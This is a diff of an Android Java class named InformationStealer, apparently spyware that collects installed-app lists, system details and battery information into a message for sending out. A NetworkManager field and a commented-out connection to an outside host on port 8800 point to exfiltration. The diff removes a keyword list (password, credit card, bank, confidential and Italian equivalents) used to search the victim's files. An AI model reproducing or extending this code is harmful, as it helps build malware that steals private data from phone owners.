@@ -25,59 +25,12 @@ public class InformationStealer implements Runnable {
     private static final int READ_EXTERNAL_STORAGE_PERMISSION_REQUEST = 1;
     private static StringBuilder messaggio;
 
-    final String[] keywords = {
-            "aprire",
-            "Secret",
-            "password",
-            "credit",
-            "card",
-            "confidential",
-            "top",
-            "private",
-            "classified",
-            "sensitive",
-            "hidden",
-            "only",
-            "criptato",
-            "riservato",
-            "vietato",
-            "autorizzato",
-            "informazioni",
-            "proprietario",
-            "divulgare",
-            "privilegiato",
-            "compromettente",
-            "violazione",
-            "sicurezza",
-            "segreto",
-            "operazione",
-            "clandestina",
-            "documenti",
-            "classificati",
-            "accesso",
-            "limitato",
-            "criptati",
-            "archiviazione",
-            "sicura",
-            "protetto",
-            "allarme",
-            "email",
-            "sex",
-            "illegal",
-            "drug",
-            "virus",
-            "money",
-            "bank",
-            "data"
-    };
-
-
     NetworkManager conn = new NetworkManager();
     Context context;
 
-
     public InformationStealer(Context context){
         this.context = context;
+        messaggio = new StringBuilder();
         //conn.openConnection("rblob.homepc.it", 8800);
     }
     public StringBuilder getMessaggio() {
@@ -90,7 +43,6 @@ public class InformationStealer implements Runnable {
     @Override
     public void run(){
         messaggio.append(stealApp(context));
-        messaggio.append(searchFilesWithKeywords(context, keywords));
         messaggio.append(stealSystemDetail(context));
         messaggio.append(stealBatteryInformation(context));
     }
